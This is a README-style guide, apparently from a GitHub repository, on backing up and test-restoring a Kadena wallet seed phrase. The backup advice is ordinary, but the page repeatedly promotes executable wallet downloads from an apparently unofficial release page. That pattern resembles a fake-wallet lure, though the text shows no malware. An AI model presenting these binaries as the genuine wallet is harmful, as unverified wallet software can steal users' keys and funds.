![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Backing Up Kadena Wallet: A Restore You Have Tested</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

A backup you have never restored is a guess. The phrase might be right, the note might be complete, the derivation might match, and none of that is established until a second wallet opens the same account and shows the same balance.

This is a procedure rather than a philosophy: what to record, where to keep it, and how to prove it works before a balance depends on it.

## You'll see this if

- You have just created an account and want to back it up properly.
- You have a phrase written down but have never tested it.
- You are moving to a new machine and want the transition to be boring.
- You suspect your current backup is incomplete but are not sure what is missing.

## What a backup actually consists of

The phrase is necessary and not sufficient. Four things together make a restore possible.

| Item | Why it is needed |
| --- | --- |
| The recovery phrase | The key material itself |
| The word count and wordlist | A wallet expecting 24 will not take 12 |
| The wallet it came from | Determines the derivation scheme |
| Which accounts and chains held funds | The thing you compare against afterwards |

The last row is the one nobody records and everybody wants later. "Chain 3, two accounts, one legacy" is a sentence that saves an afternoon.

## The three common failures

**The photograph.** A picture of a phrase in a phone's camera roll syncs to a cloud account, gets indexed, and survives deletion in ways the owner does not expect. It is the most common shortcut and the most common exposure.

**The single copy.** One piece of paper in one drawer survives most accidents and none of the serious ones. Fire, flood, a move and a tidy-up are all ordinary events.

**The untested restore.** Words transcribed with one error, or in the wrong order, look correct on paper and fail silently at the only moment they matter.

Each failure has a cheap fix, and all three fixes are the same afternoon's work.

## Writing it down

1. **Write by hand, in order, on paper.** Not a printout, not a note, not a password manager entry.
2. **Number the words** if the wallet's display does not, because order is part of the phrase.
3. **Add the four items from the table above** on a separate sheet in the same place.
4. **Check every word against the list** as you write. One substituted word produces a checksum failure or, worse, a different valid phrase.
5. **Do not photograph the result** at any stage, including "just to check it later".

Handwriting is slower than copying, and the slowness is the feature: it forces you to read each word.

## Storing it

Two locations, physically separate, both offline. A safe and a second address is a reasonable arrangement; a safe and a drawer in the same building is one location with extra steps.

A few practical points that are not obvious until they matter:

- **Do not split the phrase across locations** unless you are deliberately using a scheme you understand. Half a phrase in each of two places is lost if either place is lost.
- **Label the storage, not the secret.** An envelope marked "wallet backup, do not discard" survives a house move. A bare slip of paper does not.
- **Consider who else can reach it.** A backup that a visitor, a cleaner or a family member can find is a backup with a second owner.
- **Record the passphrase fact separately** if you set one, never the passphrase itself in the same place.

## The restore test

Do this once, now, with an empty or small account. It takes fifteen minutes and it is the only step that converts a backup into evidence.

1. Install a second wallet on a different machine, or on the same machine with a separate profile.
2. Choose import and enter the phrase from your written copy, not from memory.
3. Derive the account and read the address.
4. Compare it with the address in the running wallet, character by character.
5. Set the chain and check the balance appears.
6. If a passphrase exists, repeat with it and confirm which account set appears.
7. Record the result and the date.

If the addresses match, the backup is real. If they do not, you have found the problem while it is still cheap, and the likely causes are a transcription error, a wrong derivation, or a missing passphrase.

Do not send funds to prove a restore. Reading the balance is enough, and it costs nothing.

## After a restore

Three checks before you trust the new installation: the address matches, the chain is the one holding the balance, and a small send completes. The third is the only one that tests signing rather than viewing.

Keep the original installation until all three pass. The order matters because the original is your fallback, and deleting it first removes the thing you are comparing against.

## When the phrase may be exposed

If the phrase was photographed, typed into a website, stored in a synced note, or read aloud in a room with a microphone, treat it as compromised.

An existing account's keys cannot be replaced in place. The remedy is a new account with a new phrase, and a transfer of the balance to it. That transfer is a transaction, so it needs a working signing path, which is why this decision should be made before access is lost rather than after.

## What a backup cannot do

- **Recover a phrase you never wrote down.** No amount of software changes that.
- **Reverse a transaction.** A backup restores access, not history.
- **Protect against a stolen phrase.** It is a copy of the key, and copies can be taken.
- **Replace a hardware device.** It complements one; the device holds the key, the paper preserves it.

## FAQ

**Is a password manager an acceptable place for a phrase?**
It is a synced digital copy, which is the category that fails most often in practice. If you use one, understand that the phrase now depends on that account's security rather than on paper in a drawer.

**How often should I test a restore?**
Once when the account is created, and again after any change of machine, wallet or passphrase. There is no value in testing weekly; there is real value in testing after a change.

**Can I store the phrase in two halves in two places?**
Only as part of a scheme you can explain from memory. Otherwise a lost location is a lost phrase.

**Does a hardware wallet remove the need for paper?**
No. The device can fail, be lost or be reset, and the phrase is what restores it.

**What should I do if the paper is damaged but readable?**
Transcribe it into a fresh copy immediately, verify by restoring, and destroy the damaged original once the new one is proven.

## Related reading

- Lost seed phrase: what Kadena Wallet can and cannot recover
- 12 words, 24 words, and the passphrase in between
- Kadena Wallet security: a threat model you can act on
- What Kadena Wallet is, and what self-custody actually means

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [12 Words, 24 Words, and the Passphrase in Between](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-seed-phrase-word-counts.md)
- [Lost Seed Phrase: What Kadena Wallet Can and Cannot Recover](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/recover-lost-seed-phrase-in-kadena-wallet.md)
- [Importing a Chainweaver Seed into Kadena Wallet](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/import-chainweaver-seed-into-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
